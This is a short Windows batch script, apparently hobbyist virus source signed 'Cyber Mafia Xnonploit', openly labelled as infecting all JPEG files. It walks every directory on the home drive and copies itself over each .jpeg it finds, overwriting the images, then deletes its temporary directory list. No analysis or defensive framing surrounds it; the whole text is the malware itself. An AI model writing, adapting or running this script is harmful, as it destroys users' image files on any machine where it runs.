:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Jpeg Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.jpeg) Do (
            Set JpegInfect=%%Z > Nul
            Copy /y %0 %JpegInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
